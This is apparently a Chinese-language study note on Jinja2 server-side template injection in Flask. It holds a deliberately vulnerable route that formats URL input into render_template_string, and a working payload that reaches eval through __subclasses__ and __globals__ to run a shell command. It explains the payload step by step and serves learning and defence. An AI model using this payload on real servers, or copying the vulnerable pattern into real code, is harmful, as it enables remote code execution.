# 环境搭建
- Windows 10
- python3
- flask
- jinja2

# 测试代码
```
from flask import Flask, render_template, render_template_string

app = Flask(__name__)  
 
@app.route("/user/<name>")
def user(name):
    template = '''
    <h3>%s</h3>
    '''%(name)
    return render_template_string(template)

if __name__ == "__main__":  
    app.run() 

```
就是把url user后面的name输出出来
> 注意这里面如果使用render_template带入html模板的话就不会产生这个问题，将html模板通过`{%% extends "layout.html" %%}`引入到python中也会出现这个问题

# 常见payload解析
常见的payload的思路都常常是利用python内置的变量属性等出发·通过调用一些隐藏的属性（方法）从而实现代码输入

```
# 命令执行
{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__=='catch_warnings' %}
		{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
	{% endif %}
{% endfor %}
```
- 当输入这段payload的时候，这段标签会被当做模板中的标签来解析
- 首先这个使用了一个循环和if的jinja2的结构找到了一个内置的类catch_warnings，
- 然后通过一个特殊的属性`__globals__`找到了当前函数所在命名空间下的所有变量
`__globals__` *这个属性是python所有函数都包含的一个属性，调用这个属性会返回所在模块命名空间里面的所有变量*
- 然后利用每个python都会加载builtins这个模块而这个模块中有eval、exec、open等函数，然后就构成了代码注入

# 相关文档
- 掘金[Flask jinja2模板注入思路总结](https://juejin.im/entry/5a91040ef265da4e9268410ehttps://juejin.im/entry/5a91040ef265da4e9268410e)
- Freebuf[探索Flask/Jinja2中的服务端模版注入](https://www.freebuf.com/articles/web/98619.html)
- csdn[内置函数+内置变量+内置模块](https://blog.csdn.net/nameix/article/details/54341949)
